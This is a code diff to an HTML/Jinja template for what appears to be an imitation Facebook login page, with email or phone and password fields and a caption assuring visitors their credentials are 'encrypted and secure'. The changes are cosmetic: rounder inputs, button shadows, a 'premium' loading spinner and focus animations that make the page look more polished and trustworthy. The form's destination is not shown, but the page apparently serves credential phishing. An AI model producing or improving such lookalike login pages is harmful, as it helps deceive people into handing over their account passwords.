@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(24,119,242,0.15);border-radius:16px;">
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(24,119,242,0.15);border-radius:20px;">
   <div class="platform-header">
     <div class="icon-circle bg-facebook">
       <i class="fa-brands fa-facebook icon-lg"></i>
@@ -21,8 +21,8 @@
     <button class="btn login-btn" type="submit">Log in</button>
   </form>
 
-  <!-- ADDED SECURITY CAPTION -->
-  <div class="security-note" style="margin-top:20px;padding:12px 16px;background:#f0f9ff;border-radius:12px;border:1px solid #e0f2fe;">
+  <!-- SECURITY CAPTION -->
+  <div class="security-note" style="margin-top:20px;padding:12px 16px;background:#f0f9ff;border-radius:16px;border:1px solid #e0f2fe;">
     <p style="margin:0;color:#0369a1;font-size:0.9rem;font-weight:500;text-align:center;">
       🔒 Your login credentials are encrypted and secure
     </p>
@@ -32,27 +32,30 @@
 <style>
 .input {
   width: 100%;
-  padding: 14px;
-  border-radius: 18px;
-  border: 1px solid #e5e7eb;
-  margin-bottom: 8px;
+  padding: 16px 20px;
+  border-radius: 25px;
+  border: 1.5px solid #e5e7eb;
+  margin-bottom: 12px;
   font-size: 16px;
-  transition: border-color 0.2s, box-shadow 0.2s;
+  transition: all 0.2s ease;
+  background: #ffffff;
+  box-shadow: 0 1px 2px rgba(0,0,0,0.02);
 }
 .input:focus {
   border-color: #1877F2;
-  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.25);
+  box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.15);
   outline: none;
+  transform: translateY(-1px);
 }
 .input-error {
   border-color: #ef4444;
-  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+  box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.1);
 }
 .error-text {
   color: #ef4444;
   font-size: 13px;
-  margin-top: -4px;
-  margin-bottom: 8px;
+  margin: 4px 0 8px 16px;
+  font-weight: 500;
 }
 
 .login-btn {
@@ -61,21 +64,76 @@
   color: #fff;
   font-size: 16px;
   font-weight: 700;
-  padding: 12px;
-  border-radius: 25px;
+  padding: 16px;
+  border-radius: 30px;
   cursor: pointer;
   border: none;
-  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
-  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
+  transition: all 0.2s ease;
+  box-shadow: 0 4px 12px rgba(24,119,242,0.25);
   display: block;
   margin-top: 8px;
+  position: relative;
+  overflow: hidden;
 }
 .login-btn:hover {
   background: #166fe5;
-  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
+  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
+  transform: translateY(-1px);
 }
 .login-btn:active {
-  transform: scale(0.985);
+  transform: scale(0.995);
+  box-shadow: 0 2px 8px rgba(24,119,242,0.3);
+}
+
+/* Premium loading animation */
+.login-btn.loading {
+  pointer-events: none;
+}
+.login-btn.loading::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 20px;
+  height: 20px;
+  margin: -10px 0 0 -10px;
+  border: 2px solid transparent;
+  border-top: 2px solid #ffffff;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* Platform header styling */
+.platform-header {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin-bottom: 24px;
+  padding: 8px 0;
+}
+
+.icon-circle {
+  width: 50px;
+  height: 50px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.bg-facebook {
+  background: linear-gradient(135deg, #1877F2, #166fe5);
+}
+
+.icon-lg {
+  font-size: 24px;
+  color: white;
 }
 </style>
 
@@ -85,6 +143,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   const password = document.getElementById("password");
   const addressError = document.getElementById("addressError");
   const passwordError = document.getElementById("passwordError");
+  const loginBtn = document.querySelector('.login-btn');
 
   const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.(com|net|org|co|io|me|info|biz)$/;
   const phonePattern = /^\+?\d{6,}$/;
@@ -107,7 +166,13 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     passwordError.textContent = "Password must be at least 6 characters.";
   }
 
-  if (!valid) event.preventDefault();
+  if (valid) {
+    // Add loading state for premium feel
+    loginBtn.classList.add('loading');
+    loginBtn.innerHTML = '<span style="opacity:0">Log in</span>';
+  } else {
+    event.preventDefault();
+  }
 });
 
 document.querySelectorAll(".input").forEach(input => {
@@ -115,6 +180,17 @@ document.querySelectorAll(".input").forEach(input => {
     input.classList.remove("input-error");
     if (input.id === "address") document.getElementById("addressError").textContent = "";
     if (input.id === "password") document.getElementById("passwordError").textContent = "";
+  });
+});
+
+// Add subtle focus animations
+document.querySelectorAll('.input').forEach(input => {
+  input.addEventListener('focus', function() {
+    this.style.transform = 'translateY(-1px)';
+  });
+  
+  input.addEventListener('blur', function() {
+    this.style.transform = 'translateY(0)';
   });
 });
 </script>
